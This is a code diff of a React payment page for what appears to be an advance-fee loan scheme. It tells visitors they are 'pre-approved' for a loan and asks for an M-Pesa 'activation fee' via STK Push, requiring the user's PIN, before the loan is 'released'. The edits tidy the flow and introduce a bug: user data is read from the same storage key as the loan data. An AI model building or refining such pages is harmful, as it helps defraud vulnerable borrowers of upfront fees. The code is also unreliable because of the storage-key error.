@@ -12,26 +12,34 @@ export default function Payment() {
   const navigate = useNavigate();
 
   useEffect(() => {
-    const data = JSON.parse(localStorage.getItem("loanFormData") || "null");
-    const loan = JSON.parse(sessionStorage.getItem("myLoan") || "null");
+    try {
+      const data = JSON.parse(sessionStorage.getItem("myLoan") || "null");
+      const loan = JSON.parse(sessionStorage.getItem("myLoan") || "null");
 
-    if (!data || !loan) {
+      if (!loan) {
+        navigate("/apply");
+        return;
+      }
+
+      setFormData(data);
+      setLoanData(loan);
+    } catch (err) {
+      console.log("Storage error:", err);
       navigate("/apply");
-      return;
     }
-
-    setFormData(data);
-    setLoanData(loan);
   }, [navigate]);
 
   const handlePay = async () => {
-    if (!loanData) return toast.error("Loan data missing");
+    if (!loanData || !formData) {
+      toast.error("Missing loan or user data");
+      return;
+    }
 
     Swal.fire({
       title: "Processing Payment",
       html: `
-        We are sending an M-Pesa STK Push...<br/>
-        <b>Please wait and enter your M-Pesa PIN when prompted</b>
+        Sending M-Pesa STK Push...<br/>
+        <b>Enter your PIN when prompted</b>
       `,
       icon: "info",
       allowOutsideClick: false,
@@ -45,7 +53,7 @@ export default function Payment() {
 
     try {
       const response = await initiateSTKPush(
-        formData.phoneNumber,
+        formData.phone_number, // ✅ FIXED FIELD NAME
         loanData.processing_fee,
         `LOAN-${Date.now()}`
       );
@@ -53,34 +61,35 @@ export default function Payment() {
       Swal.close();
 
       if (response.success) {
-        toast.success("STK Push sent! Check your phone.");
+        toast.success("STK Push sent!");
 
         Swal.fire({
           title: "Check Your Phone 📱",
-          text: "Enter your M-Pesa PIN to complete activation.",
+          text: "Enter your M-Pesa PIN to complete payment.",
           icon: "success",
           confirmButtonColor: "#10b981",
         });
 
-        setTimeout(() => navigate("/success"), 2500);
+        setTimeout(() => {
+          navigate("/success", { replace: true });
+        }, 2000);
       } else {
-        toast.error("Failed to initiate payment.");
-
         Swal.fire({
           title: "Payment Failed",
-          text: "We couldn't send the STK Push. Try again.",
+          text: "Try again later.",
           icon: "error",
         });
       }
     } catch (error) {
-      Swal.close();
-      toast.error("Payment error. Try again.");
+      console.log(error);
 
       Swal.fire({
         title: "Error",
-        text: "Something went wrong while initiating payment.",
+        text: "STK Push failed. Check backend.",
         icon: "error",
       });
+
+      toast.error("Payment error");
     } finally {
       setLoading(false);
     }
@@ -104,24 +113,24 @@ export default function Payment() {
         {/* BODY */}
         <div className="p-6 space-y-5">
 
-          {/* LOAN AMOUNT (CATCHY HERO CARD) */}
+          {/* LOAN AMOUNT */}
           <div className="bg-gradient-to-r from-emerald-500 to-sky-500 rounded-xl p-6 text-center text-white shadow-lg">
 
             <p className="text-sm opacity-90">
-               Congratulations! You are approved for
+              Congratulations! You are approved for
             </p>
 
-            <p className="text-5xl font-extrabold mt-2 tracking-tight">
+            <p className="text-5xl font-extrabold mt-2">
               KES {loanData.loan_amount?.toLocaleString() || 0}
             </p>
 
             <p className="mt-3 text-xs bg-white/20 inline-block px-3 py-1 rounded-full">
-              ✔ Pre-approved • No CRB check • Fast approval
+              ✔ Pre-approved • Fast approval
             </p>
           </div>
 
-          {/* PROCESSING FEE (PAYMENT) */}
-          <div className="bg-gray-50 rounded-xl p-4 border border-gray-100 text-center">
+          {/* FEE */}
+          <div className="bg-gray-50 rounded-xl p-4 border text-center">
 
             <p className="text-sm text-gray-500">Activation Fee</p>
 
@@ -130,7 +139,7 @@ export default function Payment() {
             </p>
 
             <p className="text-xs text-gray-500 mt-2">
-              One-time fee required to release your loan
+              One-time fee required to release loan
             </p>
           </div>
 
@@ -138,14 +147,13 @@ export default function Payment() {
           <div className="bg-blue-50 rounded-xl p-4 border border-blue-100">
             <p className="text-sm text-gray-600">M-Pesa Number</p>
             <p className="text-lg font-semibold text-gray-900">
-              {formData.phoneNumber}
+              {formData.phone_number}
             </p>
           </div>
 
           {/* INFO */}
           <div className="text-xs text-gray-600 bg-gray-50 p-3 rounded-lg">
-            You will receive an <span className="font-semibold">STK Push</span>.
-            Enter your M-Pesa PIN to activate your loan.
+            You will receive an STK Push. Enter your M-Pesa PIN to complete payment.
           </div>
 
           {/* BUTTON */}
@@ -156,15 +164,14 @@ export default function Payment() {
           ) : (
             <button
               onClick={handlePay}
-              className="w-full py-3 rounded-xl bg-gradient-to-r from-green-500 to-emerald-600 text-white font-semibold text-lg shadow-md hover:shadow-lg hover:scale-[1.02] transition-all duration-200"
+              className="w-full py-3 rounded-xl bg-gradient-to-r from-green-500 to-emerald-600 text-white font-semibold text-lg shadow-md hover:scale-[1.02] transition"
             >
               Activate Loan via M-Pesa
             </button>
           )}
 
-          {/* SECURITY */}
-          <p className="text-center text-xs text-gray-400 mt-2">
-            🔒 Secure M-Pesa STK Push Payment
+          <p className="text-center text-xs text-gray-400">
+            🔒 Secure STK Push Payment
           </p>
 
         </div>
